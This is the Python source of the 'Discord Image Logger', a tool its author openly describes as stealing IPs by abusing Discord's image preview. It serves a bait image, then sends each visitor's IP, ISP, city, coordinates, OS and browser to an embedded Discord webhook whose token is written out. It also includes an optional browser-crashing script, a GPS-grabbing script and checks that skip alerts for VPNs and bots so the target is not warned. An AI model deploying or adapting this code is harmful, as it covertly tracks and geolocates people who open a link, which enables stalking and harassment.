# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1336060555219173478/Dk_P8kQNTWCi0RcryVlQ64JQFkS4zaxDUx0qenF1QUi2pyaOwJiRaNgTHfZg54JVtq1H",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
